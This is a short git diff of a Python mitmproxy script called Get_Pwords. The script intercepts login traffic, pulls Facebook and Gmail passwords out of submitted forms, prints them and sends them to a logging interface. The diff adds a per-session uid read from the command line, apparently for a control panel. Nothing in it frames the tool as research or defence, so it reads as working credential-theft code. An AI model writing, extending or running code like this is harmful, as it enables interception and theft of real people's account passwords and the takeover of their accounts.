@@ -1,17 +1,13 @@
-import mitmproxy
+import mitmproxy, sys
 from mitm_buffer import *
 
 class Get_Pwords:
 	'''
 		TO DO:
-			add:
-				yelp
-				wikipedia
-				soundcloud
+		pass uid from control_pannel.py
 	'''
-
-	def __init__(self):
-		self.interface = MITM_Interface()
+	def __init__(self, uid):
+		self.interface = MITM_Interface(uid)
 
 	def get_facebook(self,form, flow):
 		if form['pass'] and "facebook.com" in flow.request.headers[':authority']:
@@ -28,7 +24,7 @@ class Get_Pwords:
 			pass
 
 	def get_google(self, form, flow):
-		if "Passwd" in form and form['Page'] == "PasswordSeparationSignIn" and "google.com" in flow.request.headers[':authority']:
+		if form['Passwd'] and form['Page'] == "PasswordSeparationSignIn" and "google.com" in flow.request.headers[':authority']:
 			print("account: Gmail, password:", form['Passwd'])
 			return self.interface.read_traffic("google", form['Passwd'])
 		else:
@@ -138,8 +134,8 @@ class Get_Pwords:
 			except KeyError as ke:
 				pass
 
-
-				
-
 def start():
-	return Get_Pwords()
+	ide = ''.join(sys.argv)
+	return Get_Pwords(ide.lstrip("get_pwords.py--"))
+
+
